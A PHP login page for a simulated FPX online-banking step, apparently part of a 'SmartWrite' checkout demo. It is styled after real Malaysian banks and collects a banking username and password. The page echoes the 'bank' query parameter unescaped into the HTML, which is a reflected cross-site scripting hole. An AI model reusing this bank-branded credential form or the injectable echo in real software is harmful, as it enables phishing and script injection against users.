<?php
session_start();

$bank = isset($_GET['bank']) ? $_GET['bank'] : 'FPX Bank';

$bankName = str_replace(['FPX+', '+'], ['FPX - ', ' '], $bank);

$bankThemes = [
    'Maybank2u' => ['#f7c600', '#111', 'Maybank'],
    'CIMB Clicks' => ['#d71920', '#fff', 'CIMB'],
    'Public Bank' => ['#e21b2d', '#fff', 'Public Bank'],
    'RHB Now' => ['#005baa', '#fff', 'RHB'],
    'Hong Leong Connect' => ['#d71920', '#fff', 'Hong Leong']
];

$themeColor = '#2d9cdb';
$textColor = '#fff';
$bankLogo = 'FPX';

foreach ($bankThemes as $key => $value) {
    if (stripos($bankName, $key) !== false || stripos($bankName, str_replace(' ', '', $key)) !== false) {
        $themeColor = $value[0];
        $textColor = $value[1];
        $bankLogo = $value[2];
        break;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title><?php echo $bankName; ?> | Secure Login</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Segoe UI', Arial, sans-serif;
}

body{
    min-height:100vh;
    background:linear-gradient(135deg,#eaf2f8,#f8fbff);
    display:flex;
    justify-content:center;
    align-items:center;
}

.bank-container{
    width:460px;
    background:#fff;
    border-radius:22px;
    overflow:hidden;
    box-shadow:0 20px 50px rgba(0,0,0,.15);
}

.bank-header{
    background:<?php echo $themeColor; ?>;
    color:<?php echo $textColor; ?>;
    padding:35px;
    text-align:center;
}

.logo-circle{
    width:95px;
    height:95px;
    border-radius:50%;
    background:rgba(255,255,255,.25);
    display:flex;
    justify-content:center;
    align-items:center;
    margin:0 auto 18px;
    font-size:22px;
    font-weight:900;
}

.bank-header h2{
    font-size:30px;
    margin-bottom:8px;
}

.bank-header p{
    font-size:14px;
    opacity:.9;
}

.bank-body{
    padding:35px;
}

.secure-box{
    background:#eef8ff;
    border-left:5px solid #2d9cdb;
    padding:14px;
    border-radius:10px;
    color:#4b5563;
    font-size:13px;
    line-height:1.5;
    margin-bottom:25px;
}

.form-group{
    margin-bottom:22px;
}

.form-group label{
    display:block;
    font-weight:700;
    margin-bottom:9px;
    color:#222;
}

.input-box{
    position:relative;
}

.input-box i{
    position:absolute;
    left:17px;
    top:50%;
    transform:translateY(-50%);
    color:#2d9cdb;
}

.input-box input{
    width:100%;
    height:53px;
    border:1px solid #d8e1ea;
    border-radius:12px;
    padding-left:48px;
    font-size:15px;
    outline:none;
    background:#fafafa;
}

.input-box input:focus{
    border-color:#2d9cdb;
    background:#fff;
    box-shadow:0 0 0 4px rgba(45,156,219,.12);
}

.login-btn{
    width:100%;
    height:55px;
    border:none;
    border-radius:13px;
    background:#2d9cdb;
    color:white;
    font-size:16px;
    font-weight:800;
    cursor:pointer;
    transition:.25s;
}

.login-btn:hover{
    background:#2383c4;
    transform:translateY(-2px);
}

.bank-footer{
    text-align:center;
    margin-top:22px;
}

.bank-footer a{
    color:#2d9cdb;
    text-decoration:none;
    font-weight:700;
}

.bank-footer a:hover{
    text-decoration:underline;
}

.security-row{
    display:flex;
    justify-content:center;
    gap:18px;
    margin-top:25px;
    color:#777;
    font-size:12px;
}

.security-row span{
    display:flex;
    align-items:center;
    gap:5px;
}
</style>
</head>

<body>

<div class="bank-container">

    <div class="bank-header">
        <div class="logo-circle">
            <?php echo $bankLogo; ?>
        </div>

        <h2><?php echo $bankName; ?></h2>
        <p>Secure FPX Online Banking Login</p>
    </div>

    <div class="bank-body">

        <div class="secure-box">
            <i class="fas fa-lock"></i>
            You are entering a simulated secure FPX banking page for SmartWrite payment verification.
        </div>

        <form action="bank-otp.php" method="POST">

            <input type="hidden" name="bank" value="<?php echo $bankName; ?>">

            <div class="form-group">
                <label>Username / User ID</label>
                <div class="input-box">
                    <i class="fas fa-user"></i>
                    <input type="text" name="bank_username" placeholder="Enter your banking username" required>
                </div>
            </div>

            <div class="form-group">
                <label>Password</label>
                <div class="input-box">
                    <i class="fas fa-key"></i>
                    <input type="password" name="bank_password" placeholder="Enter your password" required>
                </div>
            </div>

            <button type="submit" class="login-btn">
                <i class="fas fa-shield-alt"></i>
                Login Securely
            </button>

        </form>

        <div class="security-row">
            <span><i class="fas fa-lock"></i> SSL Secure</span>
            <span><i class="fas fa-shield-alt"></i> FPX Verified</span>
        </div>

        <div class="bank-footer">
            <a href="checkout.php">
                <i class="fas fa-arrow-left"></i>
                Cancel and return to checkout
            </a>
        </div>

    </div>

</div>

</body>
</html>